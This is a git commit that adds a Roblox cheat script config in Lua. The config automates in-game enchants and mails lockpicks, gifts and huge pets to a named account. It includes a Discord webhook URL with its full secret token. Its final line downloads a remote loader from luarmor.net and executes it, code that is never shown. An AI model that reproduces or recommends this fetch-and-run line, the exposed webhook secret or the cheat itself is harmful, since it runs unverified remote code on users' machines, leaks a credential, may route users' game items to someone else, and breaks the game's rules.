da22720a58d86d1b9c3aa9b3e988b0a4f1b72efd
TheArexH4CKER <63061089+TheArexH4CKER@users.noreply.github.com>
2024-12-29 17:36:30 +0100

    Add files via upload

---
+++ Method.lua
@@ -0,0 +1,26 @@
+getgenv().Config = {
+    ["EquipEnchants"] = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Strong Pets", "Coins", "Fortune"},
+    ["SnowstormSurvival"] = true,
+    ["Mailing"] = {
+        ["Usernames"] = {"BigMan_MC"},
+        ["Items"] = {
+            ["Misc"] = {
+                ["Lockpick A"] = 25,
+                ["Lockpick B"] = 10,
+                ["Lockpick C"] = 3,
+            },
+            ["Lootbox"] = {
+                ["Jolly Gift"] = 5,
+            },
+            ["Egg"] = {
+                ["Huge Machine Egg 4"] = 1,
+            },
+        },
+        ["MailAllHuges"] = false --// False will mail all new huges, True will send all huges in inventory
+    },
+    ["Notifications"] = {
+        ["UserID"] = "667064890359545917",
+        ["Webhook"] = "https://discord.com/api/webhooks/1249413828547182742/VUCfE51nqu43KBRgI1qqyhoZd7AeGZtrQgsr1AADWAABe1xSFk62t77zHTCJtGqFCzk3"
+    }
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()
